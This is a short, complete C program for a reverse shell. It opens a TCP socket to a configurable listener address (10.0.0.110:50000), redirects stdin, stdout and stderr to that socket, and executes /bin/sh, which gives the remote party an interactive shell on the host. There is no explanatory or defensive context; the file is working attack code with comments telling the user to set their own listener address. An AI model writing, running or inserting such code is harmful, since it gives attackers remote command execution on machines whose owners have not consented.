#include <unistd.h>
#include <stdio.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/socket.h>

#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LHOST "10.0.0.110" /* Put your network location here */
#define LPORT "50000" /* Optional (change if u want) */

int main()
{
    /*
        Summary
        1 - Open a socket with destination and port
        2 - Try for established a connection
        3 - Copy stdout, stdin and stderr from host to destination
        4 - Execute execve
    */

    /* Open a socket */
    int sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd == -1)
        return fprintf(stderr, "Can't open the local socket because: %s\n", strerror(errno));
    struct sockaddr_in saddr;

    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = inet_addr(LHOST);
    saddr.sin_port = htons(atoi(LPORT));

    /* Try for established a connection */
    if (connect(sfd, (struct sockaddr *)&saddr, sizeof(saddr)) == -1) {
        printf("Can't establish a connection: %s\n", strerror(errno));
        close(sfd);
        return errno;
    } else
        puts("Connection has been established");
    dup2(sfd, 0);
    dup2(sfd, 1);
    dup2(sfd, 2);

    char *const shArgs[] = {[0] = "", NULL};

    execve("/bin/sh", shArgs, NULL);

    /* Doesn't close the socket connection */
    /* This program never returns */
    __builtin_trap();
}
